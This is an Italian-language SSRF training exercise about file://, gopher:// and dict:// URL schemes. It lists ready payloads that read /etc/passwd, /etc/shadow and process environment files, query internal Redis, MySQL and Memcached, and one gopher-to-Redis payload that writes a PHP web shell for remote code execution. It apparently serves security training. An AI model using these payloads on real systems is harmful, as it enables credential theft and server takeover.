📡 Esercizio 5: Protocolli Pericolosi

Oltre HTTP – file://, gopher://, dict://
📂 file://
Leggi file locali dal server:
file:///etc/passwd file:///etc/shadow file:///var/www/html/config.php file:///proc/self/environ file:///proc/self/cmdline

Metodo: Seleziona curl
🐿️ gopher://
Invia dati raw a servizi:
gopher://127.0.0.1:6379/ _INFO gopher://127.0.0.1:6379/ _SET%20key%20value gopher://127.0.0.1:3306/ _[raw MySQL packet]

Può interagire con Redis, MySQL, SMTP!
📖 dict://
Simile a gopher per alcuni servizi:
dict://127.0.0.1:6379/INFO dict://127.0.0.1:11211/ stats

Utile per: Redis, Memcached
🔥 Gopher + Redis = RCE
Con gopher:// puoi inviare comandi Redis per scrivere una web shell:
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html/%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20x%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0d%0aSAVE

Questo scrive una shell PHP in /var/www/html/shell.php!
💡 Nota
Non tutti i metodi di fetch supportano questi protocolli. cURL supporta file://, gopher://, dict://. file_get_contents() supporta file:// ma non gopher://.
